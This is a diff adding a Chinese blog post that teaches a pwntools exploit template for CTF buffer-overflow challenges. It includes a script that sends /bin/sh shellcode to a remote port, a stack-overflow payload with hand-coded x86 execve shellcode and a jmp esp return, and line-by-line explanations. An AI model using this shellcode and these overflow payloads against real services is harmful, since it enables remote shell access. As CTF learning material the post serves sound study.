@@ -1,0 +1,124 @@
+---
+layout:     post                    # 使用的布局（不需要改）
+title:      Pwn脚本               # 标题 
+subtitle:   pwn脚本 #副标题
+date:       2018-10-03             # 时间
+author:     XT                      # 作者
+header-img: img/post-bg-alibaba.jpg    #这篇文章标题背景图片
+catalog: true                       # 是否归档
+tags:                               #标签
+    - pwn
+---
+
+# pwn脚本模板
+>这是**pwn脚本模板**的简介
+
+
+
+## 1. 大致框架
+
+官网的一个简单样例
+
+```
+from pwn import *
+context(arch = 'i386', os = 'linux')
+r = remote('exploitme.example.com', 31337)
+# EXPLOIT CODE GOES HERE
+r.send(asm(shellcraft.sh()))
+r.interactive()
+```
+
+
+自己测试的
+
+```
+
+from pwn import *
+sh = process('./boverflow')
+context(arch = 'i386', os = 'linux')
+r = remote('127.0.0.1', 9999)
+shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode_x86 += "\x0b\xcd\x80"
+sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
+jmp_esp = 0x08048504
+payload = shellcode_x86 + (0x20 - len(shellcode_x86)) * 'b'+ 'bbbb' + p32(jmp_esp) + sub_esp_jmp
+#print payload
+r.sendline(payload)
+r.interactive()
+
+```
+
+基本上仿造这个格式就可以写exp了。
+
+```
+from pwn import *
+```
+
+用来导入pwntools模块
+
+```
+context(arch = 'i386', os = 'linux')
+```
+
+设置目标机的信息
+
+```
+r = remote('exploitme.example.com', 31337)
+```
+
+用来建立一个远程连接，url或者ip作为地址，然后指明端口
+
+这里也可以仅仅使用本地文件,调试时方便:
+
+```
+r = process("./boverflow")
+```
+
+boverflow即为文件名,这使得改变远程和本地十分方便.
+
+```
+asm(shellcraft.sh())
+```
+
+asm()函数接收一个字符串作为参数，得到汇编码的机器代码。 
+ 比如
+
+```
+>>> asm('mov eax, 0')
+'\xb8\x00\x00\x00\x00'12
+```
+
+shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。
+
+其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。
+
+而这里的shellcraft.sh()则是执行/bin/sh的shellcode了
+
+r.send()将shellcode发送到远程连接
+
+最后，
+
+```
+r.interactive()1
+```
+
+将控制权交给用户，这样就可以使用打开的shell了
+
+
+
+## Context设置
+
+`context`是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。
+
+一般来说我们设置context只需要简单的一句话:
+
+```
+context(os='linux', arch='amd64', log_level='debug')
+```
+
+这句话的意思是： 
+
+1. os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux 
+2. arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ 
+3. log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。
